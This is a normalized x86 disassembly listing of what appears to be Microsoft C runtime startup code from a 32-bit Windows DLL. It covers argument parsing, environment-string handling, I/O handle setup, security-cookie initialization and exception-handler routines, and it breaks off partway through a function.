xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_1000a2b6
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_1000cdc0
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_1000b75a
push esi
call sub_10010155
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_1000a2b6
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_10012f28
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_10010155
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_10012f9d
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_10012f28
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_10012dbc
add esp 0xc
jmp r-xdata
sub_1000f01a
push 0x3
call sub_1001306a
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_1000ee6b
push 0xff
call sub_1000ee6b
pop ecx
pop ecx
push 0x3
call sub_1001306a
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1000f053
push 0xc
push r--data
call sub_1000f940
push 0xe
call sub_10011e3f
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000f0ba
call sub_1000f985
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_10009957
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_10009957
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_1000f0d0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_1000f158
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_10009991
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_1000f19d
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100130a9
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_1000f1e9
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10009f96
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_1000f237
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001312b
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_1000f289
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_1000f19d
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_1000f19d
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_1000f4ce
mov edi edi
push esi
push edi
mov edi rw-data
add edi 0x4
cmp edi rw-data
jl r-xdata
lea ecx [ eax + 0x800 ]
cmp eax ecx
jae r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
push [ edi ]
call sub_10009957
and [ edi ] 0x0
pop ecx
lea esi [ eax + 0xc ]
mov eax [ edi ]
add esi 0x40
add eax 0x800
lea ecx [ esi - 0xc ]
cmp ecx eax
jb r-xdata
push esi
call [ DeleteCriticalSection@IAT ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
sub_1000f521
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_1000e6df
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_1000f19d
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_1000cdc0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_1000cdc0
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_10009957
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_1000f19d
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_10009957
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_1000eaee
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000b75a
int3
add edi 0x4
sub_1000f5fd
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_100131ec
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_100131ec
pop ecx
test eax eax
je r-xdata
call sub_100131ec
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_1000f797
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_1000e6df
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_1000f5fd
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_1000f158
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_1000f5fd
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1000f852
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_1000f158
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_10009957
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_1000f8e9
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1000f90f
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1000f940
push sub_1000f9a0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_1000f9a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10008d64
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10008d64
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_10010c5b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_10010c12
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10008d64
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10008d64
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_10010c42
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_10010c5b
mov eax [ ebp + 0xc ]
push r--data
call sub_10012d00
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10008d64
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_10010c29
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10008d64
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_1000fb2f
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1000bbd4
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_1000fc79
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_1000fb2f
pop ecx
pop ecx
pop ebp
retn
sub_1000fc99
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_1000fd34
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10008d64
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_10009ef0
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_10009991
pop ecx
cmp eax ebx
je r-xdata
call sub_1000ff70
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_10009ef0
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_10009991
pop ecx
cmp eax ebx
je r-xdata
call sub_1000ff70
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_1000ff1b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10009611
push [ ebp + 0x28 ]
